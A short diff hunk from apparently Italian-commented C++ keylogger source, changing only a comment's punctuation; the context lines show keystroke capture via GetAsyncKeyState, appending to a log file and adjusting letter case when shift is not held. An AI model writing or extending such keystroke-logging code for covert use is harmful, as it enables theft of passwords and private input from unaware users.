@@ -176,7 +176,7 @@ void keylog(void) //Key logger
                 write.open(path.c_str(), ios::out | ios::app);
 
                 // questo if controlla se shift non è abilitato sulla tastiera e quindi stiamo scrivendo in minuscolo
-                //aggiungo 32 perche nella tab Ascii i valori che vanno da 97 fino a 122 sono lettere minuscole
+                //aggiungo 32 perche nella tab Ascii i valori che vanno da 97 fino a 122 sono lettere minuscole.
                 if (((c > 64) && (c < 91)) && !(GetAsyncKeyState(0x10)))
                 {
                     c += 32;
